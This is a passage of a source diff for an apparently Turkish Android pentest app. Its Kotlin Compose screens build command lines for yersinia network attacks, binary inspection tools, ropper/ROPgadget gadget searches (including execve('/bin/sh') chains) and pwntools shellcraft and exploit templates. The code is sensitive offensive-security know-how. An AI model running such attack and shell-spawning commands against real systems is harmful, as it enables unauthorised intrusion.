+                Box(
+                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { execMode = m }.padding(vertical = 5.dp),
+                    contentAlignment = Alignment.Center
+                ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(8.dp))
+        OutlinedTextField(value = iface, onValueChange = { iface = it }, label = { Text("Ağ Arayüzü (-i: eth0)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+
+        if (execMode == "cli") {
+            Spacer(modifier = Modifier.height(10.dp))
+            Text(text = "PROTOKOL SALDIRI SEÇENEĞİ (-attack)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            attacksForProtocol.forEach { (aid, desc) ->
+                val sel = attackId == aid
+                Box(
+                    modifier = Modifier.fillMaxWidth().padding(vertical = 2.dp).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { attackId = aid }.padding(horizontal = 10.dp, vertical = 7.dp)
+                ) { Text(text = desc, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "SEÇENEKLER", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(6.dp))
+        ToggleOption(label = "-M MAC Adres Sahteciliğini Kapat (Disable MAC Spoof)", checked = disableMacSpoof, onCheckedChange = { disableMacSpoof = it })
+        ToggleOption(label = "-v Ayrıntılı Çıktı (Verbose)", checked = verbose, onCheckedChange = { verbose = it })
+        Spacer(modifier = Modifier.height(4.dp))
+        OutlinedTextField(value = logFile, onValueChange = { logFile = it }, label = { Text("Log Dosyası (-l dosya.log)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+
+        val parts = mutableListOf("sudo yersinia")
+        if (execMode == "cli") {
+            parts.add(protocol)
+            parts.addAll(listOf("-attack", attackId.toString()))
+            parts.addAll(listOf("-i", iface))
+        } else {
+            parts.add(execMode)
+            if (iface.isNotBlank()) parts.addAll(listOf("-i", iface))
+        }
+        if (disableMacSpoof) parts.add("-M")
+        if (verbose) parts.add("-v")
+        if (logFile.isNotBlank()) parts.addAll(listOf("-l", logFile.trim()))
 
         GeneratedCommandCard(command = parts.joinToString(" "), language = language)
     }
@@ -12032,27 +12701,626 @@ fun TruffleHogBuilder(language: AppLanguage) {
 // 9. REVERSE & FORENSICS & EXPLOITATION BUILDERS
 // -------------------------------------------------------------
 
-// 53. CHECKSEC
+// -------------------------------------------------------------
+// 9. REVERSE & FORENSICS & EXPLOITATION BUILDERS
+// -------------------------------------------------------------
+
+// 71. CHECKSEC & BINUTILS COMPANION
 @Composable
 fun ChecksecBuilder(language: AppLanguage) {
-    var mode by remember { mutableStateOf("file") }
+    var toolMode by remember { mutableStateOf("checksec") }
+    var targetMode by remember { mutableStateOf("file") }
     var targetPath by remember { mutableStateOf("./vuln_binary") }
+    var outputFormat by remember { mutableStateOf("standard") }
+    var extended by remember { mutableStateOf(false) }
+    var fortify by remember { mutableStateOf(false) }
+    var readelfFlag by remember { mutableStateOf("-h") }
+    var readelfWide by remember { mutableStateOf(true) }
+    var objdumpIntel by remember { mutableStateOf(true) }
+    var objdumpGot by remember { mutableStateOf(false) }
+    var objdumpDemangle by remember { mutableStateOf(true) }
+    var nmDynamic by remember { mutableStateOf(true) }
+    var nmDemangle by remember { mutableStateOf(true) }
+    var nmUndefinedOnly by remember { mutableStateOf(false) }
 
     Column {
-        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
-            listOf("file" to "Tek Dosya (--file)", "dir" to "Dizin (--dir)").forEach { (m, lbl) ->
-                val sel = mode == m
+        Text(text = "ANALİZ ARACI SEÇİMİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf("checksec" to "checksec", "readelf" to "readelf", "objdump" to "objdump", "nm" to "nm").forEach { (tm, lbl) ->
+                val sel = toolMode == tm
                 Box(
-                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp),
+                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { toolMode = tm }.padding(vertical = 6.dp),
+                    contentAlignment = Alignment.Center
+                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        if (toolMode == "checksec") {
+            Text(text = "DENETİM HEDEFİ MODU", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                listOf(
+                    "file" to "Tek Dosya (--file)",
+                    "dir" to "Dizin Tarama (--dir)",
+                    "proc" to "Çalışan PID (--proc)",
+                    "proc_all" to "Tüm Süreçler (--proc-all)"
+                ).forEach { (m, lbl) ->
+                    val sel = targetMode == m
+                    Box(
+                        modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable {
+                            targetMode = m
+                            if (m == "dir") targetPath = "/usr/bin"
+                            else if (m == "proc") targetPath = "1337"
+                            else if (m == "file") targetPath = "./vuln_binary"
+                        }.padding(horizontal = 8.dp, vertical = 5.dp)
+                    ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+            if (targetMode != "proc_all") {
+                Spacer(modifier = Modifier.height(8.dp))
+                OutlinedTextField(
+                    value = targetPath,
+                    onValueChange = { targetPath = it },
+                    label = { Text(if (targetMode == "proc") "Hedef Süreç ID (PID)" else "Hedef İkili Dosya / Dizin Yolu") },
+                    modifier = Modifier.fillMaxWidth(),
+                    colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
+                    singleLine = true
+                )
+            }
+
+            Spacer(modifier = Modifier.height(10.dp))
+            Text(text = "RAPOR FORMATI (--output)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                listOf("standard" to "Konsol", "json" to "JSON", "xml" to "XML", "csv" to "CSV").forEach { (fmt, lbl) ->
+                    val sel = outputFormat == fmt
+                    Box(
+                        modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { outputFormat = fmt }.padding(vertical = 5.dp),
+                        contentAlignment = Alignment.Center
+                    ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+
+            Spacer(modifier = Modifier.height(10.dp))
+            Text(text = "SEÇENEKLER", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(6.dp))
+            ToggleOption(label = "--extended Genişletilmiş Kontrol (Clang CFI, SafeStack, vb.)", checked = extended, onCheckedChange = { extended = it })
+            ToggleOption(label = "--fortify Derleyici Güçlendirme (Fortify Source) Denetimi", checked = fortify, onCheckedChange = { fortify = it })
+
+            val parts = mutableListOf("checksec")
+            when (targetMode) {
+                "file" -> if (fortify) parts.add("--fortify-file=${targetPath.trim()}") else parts.add("--file=${targetPath.trim()}")
+                "dir" -> parts.add("--dir=${targetPath.trim()}")
+                "proc" -> if (fortify) parts.add("--fortify-proc=${targetPath.trim()}") else parts.add("--proc=${targetPath.trim()}")
+                "proc_all" -> parts.add(if (fortify) "--fortify-proc-all" else "--proc-all")
+            }
+            if (outputFormat != "standard") parts.add("--output=$outputFormat")
+            if (extended) parts.add("--extended")
+
+            GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+
+        } else if (toolMode == "readelf") {
+            OutlinedTextField(value = targetPath, onValueChange = { targetPath = it }, label = { Text("Hedef ELF Dosyası Yolu") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            Spacer(modifier = Modifier.height(10.dp))
+            Text(text = "READELF BAŞLIK / BÖLÜM SEÇENEĞİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                listOf(
+                    "-h" to "ELF Header (-h)",
+                    "-l" to "Program Headers (-l)",
+                    "-S" to "Section Headers (-S)",
+                    "-s" to "Sembol Tablosu (-s)",
+                    "-d" to "Dinamik Etiketler (-d)",
+                    "-r" to "Relocations (-r)",
+                    "-a" to "Tüm Başlıklar (-a)"
+                ).forEach { (f, lbl) ->
+                    val sel = readelfFlag == f
+                    Box(
+                        modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { readelfFlag = f }.padding(horizontal = 8.dp, vertical = 5.dp)
+                    ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+            Spacer(modifier = Modifier.height(6.dp))
+            ToggleOption(label = "-W Geniş Çıktı Modu (Genişlik Kırpmasını Önle)", checked = readelfWide, onCheckedChange = { readelfWide = it })
+
+            val parts = mutableListOf("readelf", readelfFlag)
+            if (readelfWide) parts.add("-W")
+            parts.add(targetPath.trim())
+            GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+
+        } else if (toolMode == "objdump") {
+            OutlinedTextField(value = targetPath, onValueChange = { targetPath = it }, label = { Text("Hedef İkili Dosya Yolu") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            Spacer(modifier = Modifier.height(8.dp))
+            ToggleOption(label = "-d -M intel Intel Sözdizimi ile Disassemble Et", checked = objdumpIntel, onCheckedChange = { objdumpIntel = it })
+            ToggleOption(label = "-R Dinamik Relocation Girişleri ve GOT Adresleri", checked = objdumpGot, onCheckedChange = { objdumpGot = it })
+            ToggleOption(label = "-C C++ Sembol İsimlerini Demangle Et", checked = objdumpDemangle, onCheckedChange = { objdumpDemangle = it })
+
+            val parts = mutableListOf("objdump")
+            if (objdumpIntel) parts.addAll(listOf("-d", "-M", "intel"))
+            if (objdumpGot) parts.add("-R")
+            if (objdumpDemangle) parts.add("-C")
+            parts.add(targetPath.trim())
+            GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+
+        } else {
+            // nm
+            OutlinedTextField(value = targetPath, onValueChange = { targetPath = it }, label = { Text("Hedef Kütüphane / ELF Dosya Yolu") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            Spacer(modifier = Modifier.height(8.dp))
+            ToggleOption(label = "-D Dinamik Sembol Tablosunu Oku (.dynsym)", checked = nmDynamic, onCheckedChange = { nmDynamic = it })
+            ToggleOption(label = "-C Sembolleri Çözümle (Demangle)", checked = nmDemangle, onCheckedChange = { nmDemangle = it })
+            ToggleOption(label = "-u Sadece Tanımsız (Import Edilen) Sembolleri Listele", checked = nmUndefinedOnly, onCheckedChange = { nmUndefinedOnly = it })
+
+            val parts = mutableListOf("nm")
+            if (nmDynamic) parts.add("-D")
+            if (nmDemangle) parts.add("-C")
+            if (nmUndefinedOnly) parts.add("-u")
+            parts.add(targetPath.trim())
+            GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+        }
+    }
+}
+
+// 72. ROPPER & ROPGADGET
+@Composable
+fun RopperBuilder(language: AppLanguage) {
+    var engine by remember { mutableStateOf("ropper") }
+    var binaryPath by remember { mutableStateOf("./vuln_binary") }
+    var gadgetType by remember { mutableStateOf("all") }
+    var searchQuery by remember { mutableStateOf("pop rdi%") }
+    var badbytes by remember { mutableStateOf("00,0a,0d") }
+    var enableBadbytes by remember { mutableStateOf(false) }
+    var instCount by remember { mutableStateOf("4") }
+    var arch by remember { mutableStateOf("auto") }
+    var chainType by remember { mutableStateOf("none") }
+    var noColor by remember { mutableStateOf(true) }
+    var detail by remember { mutableStateOf(false) }
+    var allGadgets by remember { mutableStateOf(false) }
+
+    // ROPgadget parameters
+    var ropchain by remember { mutableStateOf(true) }
+    var depth by remember { mutableStateOf("5") }
+    var stringFilter by remember { mutableStateOf("/bin/sh") }
+    var enableStringFilter by remember { mutableStateOf(false) }
+    var nosys by remember { mutableStateOf(false) }
+
+    Column {
+        Text(text = "ROP MOTORU SEÇİMİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            listOf("ropper" to "Ropper (Gelişmiş Filtre)", "ROPgadget" to "ROPgadget (Otomatik Zincir)").forEach { (eng, lbl) ->
+                val sel = engine == eng
+                Box(
+                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { engine = eng }.padding(vertical = 6.dp),
                     contentAlignment = Alignment.Center
                 ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
             }
         }
         Spacer(modifier = Modifier.height(8.dp))
-        OutlinedTextField(value = targetPath, onValueChange = { targetPath = it }, label = { Text("Hedef İkili Dosya / Dizin") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        OutlinedTextField(value = binaryPath, onValueChange = { binaryPath = it }, label = { Text("Hedef İkili Dosya (Binary / libc.so)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
 
-        val cmd = if (mode == "file") "checksec --file=$targetPath" else "checksec --dir=$targetPath"
-        GeneratedCommandCard(command = cmd, language = language)
+        if (engine == "ropper") {
+            Spacer(modifier = Modifier.height(10.dp))
+            Text(text = "GADGET TÜRÜ (--type)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                listOf("all" to "Tümü", "rop" to "ROP (ret)", "jop" to "JOP (jmp)", "sys" to "Syscall").forEach { (tp, lbl) ->
+                    val sel = gadgetType == tp
+                    Box(
+                        modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { gadgetType = tp }.padding(vertical = 5.dp),
+                        contentAlignment = Alignment.Center
+                    ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+
+            Spacer(modifier = Modifier.height(10.dp))
+            Text(text = "ARAMA ŞABLONLARI (--search)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                listOf(
+                    "pop rdi%" to "pop rdi (x64 Arg1)",
+                    "pop rsi%" to "pop rsi (x64 Arg2)",
+                    "pop rdx%" to "pop rdx (x64 Arg3)",
+                    "pop rax%" to "pop rax (Syscall No)",
+                    "mov [???], ???" to "Write-What-Where",
+                    "syscall" to "syscall",
+                    "int 0x80" to "int 0x80 (x86)",
+                    "leave%ret" to "Stack Pivot",
+                    "jmp esp" to "jmp esp (Shellcode)"
+                ).forEach { (qry, lbl) ->
+                    val sel = searchQuery == qry
+                    Box(
+                        modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { searchQuery = qry }.padding(horizontal = 8.dp, vertical = 5.dp)
+                    ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+            Spacer(modifier = Modifier.height(6.dp))
+            OutlinedTextField(value = searchQuery, onValueChange = { searchQuery = it }, label = { Text("Özel Arama İfadesi (--search: örn: pop rdi%)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+
+            Spacer(modifier = Modifier.height(10.dp))
+            Text(text = "OTOMATİK ZİNCİR ÜRETİCİ (--chain)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                listOf("none" to "Yok (Manual)", "execve" to "execve(/bin/sh)", "mprotect" to "mprotect(RWX)").forEach { (ch, lbl) ->
+                    val sel = chainType == ch
+                    Box(
+                        modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { chainType = ch }.padding(vertical = 5.dp),
+                        contentAlignment = Alignment.Center
+                    ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+
+            Spacer(modifier = Modifier.height(10.dp))
+            Text(text = "HEDEF MİMARİ (--arch)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                listOf("auto" to "Otomatik", "x86" to "x86 (32-bit)", "x86_64" to "x86_64", "arm" to "ARM", "mips" to "MIPS").forEach { (a, lbl) ->
+                    val sel = arch == a
+                    Box(
+                        modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { arch = a }.padding(vertical = 5.dp),
+                        contentAlignment = Alignment.Center
+                    ) { Text(text = lbl, fontSize = 9.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+
+            Spacer(modifier = Modifier.height(10.dp))
+            Text(text = "KURAL VE SINIRLAMALAR", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(6.dp))
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                OutlinedTextField(value = instCount, onValueChange = { instCount = it }, label = { Text("Maksimum Komut Derinliği (--inst-count)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            }
+            Spacer(modifier = Modifier.height(6.dp))
+            ToggleOption(label = "--badbytes Kötü Baytları Filtrele ($badbytes)", checked = enableBadbytes, onCheckedChange = { enableBadbytes = it })
+            if (enableBadbytes) {
+                Spacer(modifier = Modifier.height(4.dp))
+                OutlinedTextField(value = badbytes, onValueChange = { badbytes = it }, label = { Text("Kötü Baytlar (örn: 00,0a,0d)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            }
+            ToggleOption(label = "--nocolor Renk Kodlarını Kapat (Script Dostu)", checked = noColor, onCheckedChange = { noColor = it })
+            ToggleOption(label = "--detail Detaylı Gadget ve Hex Bilgisi Göster", checked = detail, onCheckedChange = { detail = it })
+            ToggleOption(label = "--all Mükerrer Gadget'ları Filtreleme", checked = allGadgets, onCheckedChange = { allGadgets = it })
+
+            val parts = mutableListOf("ropper", "--file", binaryPath.trim())
+            if (gadgetType != "all") parts.addAll(listOf("--type", gadgetType))
+            if (searchQuery.isNotBlank() && chainType == "none") parts.addAll(listOf("--search", "\"${searchQuery.trim()}\""))
+            if (chainType != "none") parts.addAll(listOf("--chain", chainType))
+            if (arch != "auto") parts.addAll(listOf("--arch", arch))
+            if (enableBadbytes && badbytes.isNotBlank()) parts.addAll(listOf("--badbytes", badbytes.trim()))
+            if (instCount.isNotBlank() && instCount != "6") parts.addAll(listOf("--inst-count", instCount.trim()))
+            if (noColor) parts.add("--nocolor")
+            if (detail) parts.add("--detail")
+            if (allGadgets) parts.add("--all")
+
+            GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+
+        } else {
+            // ROPgadget
+            Spacer(modifier = Modifier.height(10.dp))
+            Text(text = "ROPGADGET PARAMETRELERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(6.dp))
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                OutlinedTextField(value = depth, onValueChange = { depth = it }, label = { Text("Komut Derinliği (--depth)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            }
+            Spacer(modifier = Modifier.height(6.dp))
+            ToggleOption(label = "--ropchain Otomatik Python ROP Zinciri Üret", checked = ropchain, onCheckedChange = { ropchain = it })
+            ToggleOption(label = "--badbytes \"00|0a\" Kötü Karakterleri Engelle", checked = enableBadbytes, onCheckedChange = { enableBadbytes = it })
+            if (enableBadbytes) {
+                Spacer(modifier = Modifier.height(4.dp))
+                OutlinedTextField(value = badbytes, onValueChange = { badbytes = it }, label = { Text("Kötü Karakterler (örn: 00|0a|0d)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            }
+            ToggleOption(label = "--string Metin İfadesi Ara (/bin/sh)", checked = enableStringFilter, onCheckedChange = { enableStringFilter = it })
+            if (enableStringFilter) {
+                Spacer(modifier = Modifier.height(4.dp))
+                OutlinedTextField(value = stringFilter, onValueChange = { stringFilter = it }, label = { Text("Aranacak Metin") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            }
+            ToggleOption(label = "--nosys Syscall Gadget'larını Hariç Tut", checked = nosys, onCheckedChange = { nosys = it })
+
+            val parts = mutableListOf("ROPgadget", "--binary", binaryPath.trim())
+            if (depth.isNotBlank() && depth != "10") parts.addAll(listOf("--depth", depth.trim()))
+            if (ropchain) parts.add("--ropchain")
+            if (enableBadbytes && badbytes.isNotBlank()) parts.addAll(listOf("--badbytes", "\"${badbytes.replace(",", "|").trim()}\""))
+            if (enableStringFilter && stringFilter.isNotBlank()) parts.addAll(listOf("--string", "\"${stringFilter.trim()}\""))
+            if (nosys) parts.add("--nosys")
+
+            GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+        }
+    }
+}
+
+// 73. PWNTOOLS (PWN CLI)
+@Composable
+fun PwntoolsBuilder(language: AppLanguage) {
+    var subcommand by remember { mutableStateOf("cyclic") }
+    // cyclic
+    var cyclicMode by remember { mutableStateOf("generate") }
+    var cyclicLength by remember { mutableStateOf("200") }
+    var cyclicLookup by remember { mutableStateOf("0x6161616c") }
+    var cyclicWidth by remember { mutableStateOf("4") }
+    // asm & disasm
+    var asmCode by remember { mutableStateOf("xor rax, rax; push rax; mov rdi, rsp") }
+    var disasmHex by remember { mutableStateOf("4831c0504889e7") }
+    var arch by remember { mutableStateOf("amd64") }
+    var asmFormat by remember { mutableStateOf("hex") }
+    // checksec
+    var checksecBinary by remember { mutableStateOf("./vuln_binary") }
+    // shellcraft
+    var shellcraftTemplate by remember { mutableStateOf("amd64.linux.sh") }
+    var shellcraftFormat by remember { mutableStateOf("hex") }
+    // template
+    var templateBinary by remember { mutableStateOf("./vuln_binary") }
+    var templateHost by remember { mutableStateOf("10.10.10.50") }
+    var templatePort by remember { mutableStateOf("1337") }
+    var templateQuiet by remember { mutableStateOf(false) }
+
+    Column {
+        Text(text = "PWNTOOLS CLI ALT KOMUTU", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf(
+                "cyclic" to "cyclic (Offset Bulucu)",
+                "asm" to "asm (Assembler)",
+                "disasm" to "disasm (Ters Derleyici)",
+                "shellcraft" to "shellcraft (Kabuk Kodu)",
+                "template" to "template (Exploit İskeleti)",
+                "checksec" to "checksec (Mitigation)"
+            ).forEach { (cmd, lbl) ->
+                val sel = subcommand == cmd
+                Box(
+                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { subcommand = cmd }.padding(horizontal = 8.dp, vertical = 6.dp)
+                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        if (subcommand == "cyclic") {
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                listOf("generate" to "Kalıp Üret (Generate)", "lookup" to "Ofset Bul (Lookup -l)").forEach { (m, lbl) ->
+                    val sel = cyclicMode == m
+                    Box(
+                        modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { cyclicMode = m }.padding(vertical = 6.dp),
+                        contentAlignment = Alignment.Center
+                    ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+            Spacer(modifier = Modifier.height(8.dp))
+            if (cyclicMode == "generate") {
